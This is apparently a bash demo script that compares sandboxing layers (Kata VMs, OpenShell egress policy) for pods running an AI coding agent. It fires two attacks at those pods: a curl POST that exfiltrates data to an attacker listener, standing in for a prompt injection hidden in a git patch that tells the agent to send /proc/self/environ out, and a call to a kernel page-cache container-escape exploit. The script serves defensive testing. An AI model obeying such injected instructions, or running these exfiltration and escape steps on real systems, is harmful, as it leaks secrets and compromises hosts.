#!/usr/bin/env bash
# run-demo.sh -- Run both attacks across all 3 pods and show results
#
# Prerequisites:
#   - All 3 agent pods running (setup.sh completed)
#   - Attacker listener running
#   - oc CLI logged in
#
# Usage:
#   ./demo/run-demo.sh

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
REPO_ROOT="$(cd "$SCRIPT_DIR/.." && pwd)"

# shellcheck source=demo/lib/colors.sh
source "${SCRIPT_DIR}/lib/colors.sh"
# shellcheck source=demo/lib/utils.sh
source "${SCRIPT_DIR}/lib/utils.sh"

# Pod names
KATA_ONLY="opencode-kata-only"
OPENSHELL_ONLY="opencode-openshell-only"
DUAL="opencode-dual"
ALL_PODS=("${KATA_ONLY}" "${OPENSHELL_ONLY}" "${DUAL}")

# Results tracking
declare -A ATTACK1_RESULTS
declare -A ATTACK2_RESULTS

# --- Port-forward to gateway ---
# Required for `openshell sandbox exec` on OpenShell-protected pods.
PF_PID=""
cleanup() {
    if [ -n "${PF_PID}" ] && kill -0 "${PF_PID}" 2>/dev/null; then
        kill "${PF_PID}" 2>/dev/null || true
    fi
}
trap cleanup EXIT

# Kill any stale port-forwards on the same port
pkill -f "port-forward.*18080" 2>/dev/null || true
sleep 1

oc port-forward -n "${NAMESPACE}" svc/openshell 18080:8080 > /tmp/demo-pf.log 2>&1 &
PF_PID=$!
sleep 3
if ! kill -0 "${PF_PID}" 2>/dev/null; then
    echo "ERROR: Port-forward to OpenShell gateway failed. Check /tmp/demo-pf.log" >&2
    exit 1
fi

# =====================================================================
banner "OpenShell + Kata Dual-Protection Demo"
# =====================================================================

echo "This demo runs two attacks against three differently-protected pods"
echo "to show that neither OpenShell nor Kata alone provides complete"
echo "protection, but together they block both attack classes."
echo ""
echo "  Pod 1: opencode-kata-only      -- Kata VM (no OpenShell)"
echo "  Pod 2: opencode-openshell-only  -- OpenShell policy (no Kata)"
echo "  Pod 3: opencode-dual            -- Both Kata + OpenShell"
echo ""

# =====================================================================
section "Preflight Checks"
# =====================================================================

PREFLIGHT_OK=true

for pod in "${ALL_PODS[@]}"; do
    if pod_ready "${pod}"; then
        pass "${pod} is running"
    else
        fail "${pod} is NOT running"
        PREFLIGHT_OK=false
    fi
done

if pod_ready "$(listener_pod)"; then
    pass "attacker-listener is running"
else
    fail "attacker-listener is NOT running"
    PREFLIGHT_OK=false
fi

if [ "${PREFLIGHT_OK}" != "true" ]; then
    echo ""
    fail "Preflight checks failed. Run ./demo/setup.sh first."
    exit 1
fi

pass "All pods ready"
pause

# =====================================================================
banner "ATTACK 1: Prompt Injection Data Exfiltration"
# =====================================================================

echo "A malicious git patch contains a hidden prompt injection that"
echo "instructs the agent to read /proc/self/environ and POST it to"
echo "the attacker listener."
echo ""
echo "OpenShell should BLOCK this (egress policy denies unauthorized"
echo "destinations). Kata does NOT block this (no egress filtering)."
echo ""

# For this demo, we directly execute the exfiltration command that
# the prompt injection would trigger. This tests the network policy
# boundary reliably without depending on LLM behavior.
#
# The actual prompt injection payload is in attacks/attack1-prompt-injection/
# and can be tested manually with a real OpenCode instance.
#
# For OpenShell-protected pods, we use `openshell sandbox exec` which
# runs the command inside the supervised sandbox network namespace
# where the policy proxy enforces egress rules. Using `oc exec` would
# bypass the proxy entirely.

for pod in "${ALL_PODS[@]}"; do
    section "Attack 1 -> ${pod}"

    info "Attempting to exfiltrate /proc/self/environ to attacker listener..."

    # Record listener log position before the attempt
    LOG_BEFORE=$(listener_log_count)

    # Execute the exfiltration attempt via the appropriate exec path
    OUTPUT=$(pod_exec "${pod}" \
        curl -s --max-time 10 -X POST "http://${LISTENER_SVC}/exfil" \
        -H "Content-Type: text/plain" \
        -d "EXFIL_DATA_FROM_${pod}" \
    || true)

    pause 2

    # Check if data was received by the listener
    NEW_LOGS=$(listener_logs_since "${LOG_BEFORE}")

    if echo "${OUTPUT}" | grep -qi "policy_denied"; then
        blocked "${pod}: Egress blocked by OpenShell policy"
        ATTACK1_RESULTS["${pod}"]="BLOCKED"
        info "Response: $(echo "${OUTPUT}" | head -1)"
    elif echo "${NEW_LOGS}" | grep -q "EXFIL RECEIVED"; then
        leaked "${pod}: Data exfiltrated to attacker listener"
        ATTACK1_RESULTS["${pod}"]="DATA LEAKED"
        info "Listener received data from this pod"
    elif echo "${OUTPUT}" | grep -qi "received"; then
        leaked "${pod}: Data exfiltrated (curl returned success)"
        ATTACK1_RESULTS["${pod}"]="DATA LEAKED"
    else
        warn "${pod}: Unclear result"
        ATTACK1_RESULTS["${pod}"]="UNCLEAR"
        info "Output: $(echo "${OUTPUT}" | head -3)"
    fi

    pause
done

# =====================================================================
banner "ATTACK 2: Container Escape (CVE-2026-31431)"
# =====================================================================

echo "The Copy Fail exploit (CVE-2026-31431) corrupts a file's page"
echo "cache via a bug in the kernel's algif_aead subsystem. On runc"
echo "(overlayfs), the corruption is visible to OTHER containers"
echo "sharing the same image layer -- a true container escape."
echo ""
echo "We corrupt /opt/marker.txt inside each pod, then launch a"
echo "verification pod from the same image on the same node. If the"
echo "verification pod sees the corruption, data escaped the container."
echo ""
echo "Kata should BLOCK this (virtiofs page cache is per-VM)."
echo "OpenShell does NOT block this (kernel bug bypasses Landlock,"
echo "seccomp, no_new_privs, and the network proxy)."
echo ""

# Attack 2 uses pod_exec (openshell sandbox exec for protected pods)
# to demonstrate that even with all OpenShell protections active,
# the kernel exploit still corrupts the page cache.

for pod in "${ALL_PODS[@]}"; do
    section "Attack 2 -> ${pod}"

    NODE=$(pod_node "${pod}")
    IMAGE=$(pod_image "${pod}")
    info "Pod is on node: ${NODE}"

    # Step 1: Drop page cache to clear any state from previous tests
    info "Clearing host page cache..."
    drop_page_cache "${NODE}"
    pause 1

    # Step 2: Read marker file before exploit
    BEFORE=$(pod_exec "${pod}" cat /opt/marker.txt 2>&1 || true)
    info "Marker before: ${BEFORE}"

    # Step 3: Run the escape exploit
    info "Running CVE-2026-31431 page-cache escape exploit..."
    EXPLOIT_OUTPUT=$(pod_exec "${pod}" python3 /opt/escape_demo.py 2>&1 || true)
    echo "${EXPLOIT_OUTPUT}" | sed 's/^/    /'

    pause 1

    # Step 4: Read marker file after exploit (inside the pod)
    AFTER=$(pod_exec "${pod}" cat /opt/marker.txt 2>&1 || true)
    AFTER_CLEAN=$(echo "${AFTER}" | tr -d '\0' | head -1)
    info "Marker after (inside pod): ${AFTER_CLEAN}"

    # Step 5: Launch a verification pod on the same node
    # If the corruption escaped the container, the verification pod
    # (fresh container, same image, same node) will see it.
    info "Launching verification pod on same node..."
    VERIFY=$(verify_pod_exec "${NODE}" "${IMAGE}" cat /opt/marker.txt 2>&1 || true)
    VERIFY_CLEAN=$(echo "${VERIFY}" | tr -d '\0' | head -1)
    info "Marker in verification pod: ${VERIFY_CLEAN}"

    # Step 6: Determine result
    if echo "${VERIFY_CLEAN}" | grep -q "PWN!"; then
        compromised "${pod}: Page-cache corruption ESCAPED to other containers"
        ATTACK2_RESULTS["${pod}"]="HOST COMPROMISED"
    elif echo "${AFTER_CLEAN}" | grep -q "PWN!"; then
        contained "${pod}: Corruption visible inside pod only (VM-contained)"
        ATTACK2_RESULTS["${pod}"]="BLOCKED"
    else
        contained "${pod}: Exploit did not corrupt the page cache"
        ATTACK2_RESULTS["${pod}"]="BLOCKED"
    fi

    pause
done

# =====================================================================
banner "Results Matrix"
# =====================================================================

# Print the matrix
printf "%-30s %-20s %-20s %-20s\n" \
    "Attack" "kata-only" "openshell-only" "dual"
printf "%-30s %-20s %-20s %-20s\n" \
    "------------------------------" "--------------------" "--------------------" "--------------------"

# Attack 1 row
A1_KATA="${ATTACK1_RESULTS[${KATA_ONLY}]:-N/A}"
A1_OS="${ATTACK1_RESULTS[${OPENSHELL_ONLY}]:-N/A}"
A1_DUAL="${ATTACK1_RESULTS[${DUAL}]:-N/A}"
printf "%-30s %-20s %-20s %-20s\n" \
    "Prompt injection exfil" "${A1_KATA}" "${A1_OS}" "${A1_DUAL}"

# Attack 2 row
A2_KATA="${ATTACK2_RESULTS[${KATA_ONLY}]:-N/A}"
A2_OS="${ATTACK2_RESULTS[${OPENSHELL_ONLY}]:-N/A}"
A2_DUAL="${ATTACK2_RESULTS[${DUAL}]:-N/A}"
printf "%-30s %-20s %-20s %-20s\n" \
    "CVE-2026-31431 escape" "${A2_KATA}" "${A2_OS}" "${A2_DUAL}"

echo ""

# =====================================================================
section "Conclusion"
# =====================================================================

echo "Neither protection layer alone covers all threat classes:"
echo ""
echo "  - Kata blocks kernel exploits but allows data exfiltration"
echo "  - OpenShell blocks exfiltration but can't stop kernel bugs"
echo "  - Dual protection (Kata + OpenShell) blocks BOTH attacks"
echo ""

# Check if the results match expectations
EXPECTED=true
[ "${A1_KATA}" = "DATA LEAKED" ]    || EXPECTED=false
[ "${A1_OS}" = "BLOCKED" ]          || EXPECTED=false
[ "${A1_DUAL}" = "BLOCKED" ]        || EXPECTED=false
[ "${A2_KATA}" = "BLOCKED" ] || EXPECTED=false
[ "${A2_OS}" = "HOST COMPROMISED" ] || EXPECTED=false
[ "${A2_DUAL}" = "BLOCKED" ] || EXPECTED=false

if [ "${EXPECTED}" = "true" ]; then
    echo -e "${GREEN}${BOLD}All results match expected outcomes.${NC}"
else
    echo -e "${YELLOW}${BOLD}Some results differ from expectations. Review above.${NC}"
fi

echo ""
